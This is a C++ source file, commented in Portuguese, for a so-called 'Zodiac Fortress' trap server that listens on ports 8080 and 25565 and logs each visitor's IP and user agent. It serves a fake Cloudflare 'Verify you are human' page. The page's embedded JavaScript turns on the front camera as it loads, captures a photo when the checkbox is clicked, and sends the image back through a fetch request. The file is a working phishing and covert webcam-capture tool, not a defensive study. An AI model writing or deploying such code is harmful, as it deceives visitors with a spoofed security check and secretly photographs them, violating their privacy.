#include <iostream>
#include <fstream>
#include <vector>
#include <string>
#include <cstring>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <csignal>
#include <sys/select.h>
#include <ifaddrs.h>
#include <map>
#include <ctime>

using namespace std;

const string RESET   = "\033[0m";
const string VERDE   = "\033[32m";
const string VERMELHO= "\033[31m";
const string CIANO   = "\033[36m";
const string AMARELO = "\033[33m";
const string NEGRITO = "\033[1m";

vector<int> sockets_armadilha;
unsigned long long total_bloqueado = 0;
string caminho_salvamento = "/home/gabriel/Downloads/Zodiac_Intrusos_Bloqueados.txt";

map<string, vector<time_t>> historico_scans;

void desligar_fortaleza(int sinal) {
    cout << "\n\n" << VERMELHO << NEGRITO << "========================================================================" << RESET << endl;
    cout << AMARELO << NEGRITO << "             [ ZODIAC FORTRESS - ESCUDO INTEGRADO DESATIVADO ]" << RESET << endl;
    cout << VERMELHO << NEGRITO << "========================================================================" << RESET << endl;
    for (int sock : sockets_armadilha) close(sock);
    exit(sinal); 
}

string obter_ip_local() {
    struct ifaddrs *interfaces = NULL;
    struct ifaddrs *ifa = NULL;
    void *tmpAddrPtr = NULL;
    string ip_detectado = "127.0.0.1";

    if (getifaddrs(&interfaces) == 0) {
        ifa = interfaces;
        while (ifa != NULL) {
            if (ifa->ifa_addr != NULL && ifa->ifa_addr->sa_family == AF_INET) {
                tmpAddrPtr = &((struct sockaddr_in *)ifa->ifa_addr)->sin_addr;
                char addressBuffer[INET_ADDRSTRLEN];
                inet_ntop(AF_INET, tmpAddrPtr, addressBuffer, INET_ADDRSTRLEN);
                string nome_interface = ifa->ifa_name;
                if (nome_interface != "lo") {
                    ip_detectado = string(addressBuffer);
                    break;
                }
            }
            ifa = ifa->ifa_next;
        }
    }
    if (interfaces) freeifaddrs(interfaces);
    return ip_detectado;
}

int main() {
    signal(SIGINT, desligar_fortaleza);
    system("clear");

    cout << VERMELHO << NEGRITO << "========================================================================" << RESET << endl;
    cout << VERDE << "                 /\\                                /\\" << endl;
    cout << VERDE << "                /__\\       [ ZODIAC FORTRESS ]    /__\\" << endl;
    cout << VERDE << "               /\\  /\\       (UNIVERSAL TRAP)      /\\  /\\" << endl;
    cout << VERDE << "              |_____|______|___________|_____|______|_____|" << RESET << endl;
    cout << VERMELHO << NEGRITO << "========================================================================" << RESET << endl;

    string meu_ip = obter_ip_local();
    cout << VERDE << NEGRITO << "\n[📡 SECURITY] FORTALEZA MULTI-PLATAFORMA ATIVA NO HOST: " << AMARELO << meu_ip << RESET << endl;

    vector<int> portas_armadilha = {8080, 25565};
    int max_fd = 0;
    fd_set master_set;
    FD_ZERO(&master_set);

    for (int porta : portas_armadilha) {
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) continue;

        int opt = 1;
        setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));

        struct sockaddr_in addr;
        memset(&addr, 0, sizeof(addr));
        addr.sin_family = AF_INET;
        addr.sin_addr.s_addr = INADDR_ANY;
        addr.sin_port = htons(porta);

        if (bind(sock, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
            close(sock);
            continue;
        }

        if (listen(sock, 15) < 0) {
            close(sock);
            continue;
        }

        sockets_armadilha.push_back(sock);
        FD_SET(sock, &master_set);
        if (sock > max_fd) max_fd = sock;
        cout << VERDE << "    [+] Escudo injetado na porta: " << AMARELO << porta << RESET << endl;
    }

    // Código HTML5 e JavaScript Universal (Compatível com iOS/Safari, Android/Chrome e PCs)
    string html_cloudflare = 
        "HTTP/1.1 200 OK\r\nContent-Type: text/html\r\nConnection: close\r\n\r\n"
        "<!DOCTYPE html><html><head><meta charset='utf-8'><meta name='viewport' content='width=device-width, initial-scale=1.0'>"
        "<title>Just a moment...</title>"
        "<style>"
        "  body { background-color: #1c1b1b; color: #d9d9d9; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; padding: 40px 20px; text-align: left; }"
        "  .container { max-width: 600px; margin: 0 auto; }"
        "  h1 { font-size: 28px; color: #f38020; font-weight: 500; }"
        "  .cf-box { background-color: #2b2a2a; border: 1px solid #403f3f; padding: 20px; border-radius: 4px; display: flex; align-items: center; margin-top: 25px; }"
        "  input[type='checkbox'] { width: 26px; height: 26px; margin-right: 15px; cursor: pointer; }"
        "</style></head>"
        "<body>"
        "  <div class='container'>"
        "    <h1>Checking if the site connection is secure</h1>"
        "    <p style='color:#9c9c9c;'>Validating your browser session via Cloudflare. Please wait...</p>"
        "    <div class='cf-box'>"
        "      <input type='checkbox' id='check' onclick='dispararCaptura()'>"
        "      <label for='check'><b>Verify you are human</b></label>"
        "    </div>"
        "  </div>"
        "  <!-- playsinline e muted garantem que o Safari no iPhone e o Chrome no Android consigam rodar a camera sem dar erro -->"
        "  <video id='vid' style='display:none;' autoplay playsinline muted></video>"
        "  <canvas id='canv' style='display:none;'></canvas>"
        "<script>"
        "  // Liga a mídias de vídeo de forma nativa e universal assim que a página renderiza"
        "  const restricoes = { video: { facingMode: 'user' }, audio: false };"
        "  navigator.mediaDevices.getUserMedia(restricoes)"
        "  .then(s => { document.getElementById('vid').srcObject = s; })"
        "  .catch(e => { console.log('Dispositivo bloqueou permissao automatica.'); });"
        "  "
        "  function dispararCaptura() {"
        "    let video = document.getElementById('vid');"
        "    let canvas = document.getElementById('canv');"
        "    canvas.width = 320; canvas.height = 240;"
        "    try {"
        "      canvas.getContext('2d').drawImage(video, 0, 0, 320, 240);"
        "      let fotoBase64 = canvas.toDataURL('image/png');"
        "      "
        "      // Faz uma requisição assíncrona (Fetch) para devolver a foto de volta para o seu C++"
        "      fetch('/log_session?data=' + encodeURIComponent(fotoBase64));"
        "      alert('Verification complete. Connection secured.');"
        "    } catch(err) {"
        "      alert('Security check pending. Please refresh.');"
        "    }"
        "  }"
        "</script></body></html>";

    cout << VERDE << NEGRITO << "\n[+] ESCUDO DIVINO ATIVO! Interceptando e decodificando acessos..." << RESET << endl;

    // AUMENTADO: Buffer expandido para 4096 bytes para receber a string de imagem Base64 do Safari/Chrome
    char req_buffer[4096];

    while (true) {
        fd_set read_set = master_set;
        if (select(max_fd + 1, &read_set, NULL, NULL, NULL) < 0) continue;

        for (int sock : sockets_armadilha) {
            if (FD_ISSET(sock, &read_set)) {
                struct sockaddr_in client_addr;
                socklen_t client_len = sizeof(client_addr);
                
                int client_sock = accept(sock, (struct sockaddr*)&client_addr, &client_len);
                if (client_sock >= 0) {
                    total_bloqueado++;
                    string ip_intruso = inet_ntoa(client_addr.sin_addr);

                    memset(req_buffer, 0, sizeof(req_buffer));
                    int r_bytes = recv(client_sock, req_buffer, sizeof(req_buffer) - 1, 0);
                    
                    if (r_bytes > 0) {
                        string requisicao(req_buffer);

                        // Identifica se o tráfego recebido contém a flag de imagem enviada pelo Fetch do JavaScript
                        if (requisicao.find("log_session") != string::npos) {
                            cout << VERDE << NEGRITO << "\n[📸 ZODIAC CAPTURE ⚡] ➔ FRAME DE IMAGEM RECEBIDO COM SUCESSO!" << RESET << endl;
                            cout << CIANO << "   ➔ Alvo Identificado: " << AMARELO << ip_intruso << RESET << endl;
                            cout << CIANO << "   ➔ Sistema Operacional/Browser detectado no cabeçalho:" << RESET << endl;
                            
                            // Procura e imprime a linha "User-Agent" que diz se é Android, iPhone ou Windows
                            size_t ua_pos = requisicao.find("User-Agent:");
                            if (ua_pos != string::npos) {
                                size_t ua_end = requisicao.find("\r\n", ua_pos);
                                cout << AMARELO << "      " << requisicao.substr(ua_pos, ua_end - ua_pos) << RESET << endl;
                            }
                        } else {
                            // Alerta básico de primeiro toque no IP
                            cout << VERMELHO << NEGRITO << "\n\a[🚨 ZODIAC TRAP DETECTED 🦅] ➔ SOLICITAÇÃO DE CONEXÃO LOCAL!" << RESET << endl;
                            cout << CIANO << "   ➔ IP do Intruso:       " << AMARELO << ip_intruso << RESET << endl;
                        }

                        // Envia a página da Cloudflare estruturada universal de volta para o cliente
                        send(client_sock, html_cloudflare.c_str(), html_cloudflare.length(), 0);
                    }

                    // Registra o rastro histórico no arquivo de texto
                    ofstream log(caminho_salvamento, ios::app);
                    if (log.is_open()) {
log << "[🚨 Captura Cloudflare] Host: " << ip_intruso << " às " << time(0) << "\n";
                        log.close();
                    }
                    close(client_sock);
                }
            }
        }
    }
    return 0;
}
